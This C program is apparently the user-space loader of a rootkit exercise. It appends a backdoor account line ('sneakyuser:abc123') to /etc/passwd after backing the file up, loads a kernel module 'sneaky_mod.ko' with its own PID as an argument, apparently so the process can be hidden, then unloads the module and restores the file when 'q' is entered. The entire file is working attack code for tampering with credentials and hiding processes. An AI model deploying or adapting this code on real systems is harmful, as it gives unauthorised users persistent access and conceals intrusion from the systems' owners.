#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/wait.h>
void replace(){
  FILE* input = fopen("/etc/passwd","r+");
  FILE* output = fopen("/tmp/passwd","w+");
  int c;
  while((c=fgetc(input))!=EOF){
    fprintf(output,"%c",(char)c);
  }
  fprintf(input,"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(input);
  fclose(output);
}
void restore(){
  FILE* input = fopen("/tmp/passwd","r");
  FILE* output = fopen("/etc/passwd","w+");
  int c;
  while((c=fgetc(input))!=EOF){
    fprintf(output,"%c",(char)c);
  }
  fclose(input);
  fclose(output);
}

void load(){
  char c;
  pid_t pid_load=fork();
  if(pid_load!=0){
    while((c=fgetc(stdin))!='q'){}
    waitpid(pid_load,NULL,0);
    pid_t pid_restore=fork();
    if(pid_restore!=0){
      waitpid(pid_restore,NULL,0);
      printf("Restore the module\n");
    }
    else{
      char* argv[]={"rmmod","sneaky_mod",NULL};
      execve("/sbin/rmmod",argv,NULL);
    }
  }
  else{
    pid_load=getppid();
    char *arg=malloc(20*sizeof(*arg));
    char *arg1=malloc(20*sizeof(*arg1));
    sprintf(arg,"PID=%d",(int)pid_load);
    sprintf(arg1,"PATH=%d",(int)pid_load);
    char* argv[]={"insmod","sneaky_mod.ko",arg,arg1,NULL};
    execve("/sbin/insmod",argv,NULL);
  }
}

int main(){
  printf("sneaky_process pid=%d\n",getpid());
  replace();
  load();
  restore();
  return 0;
}
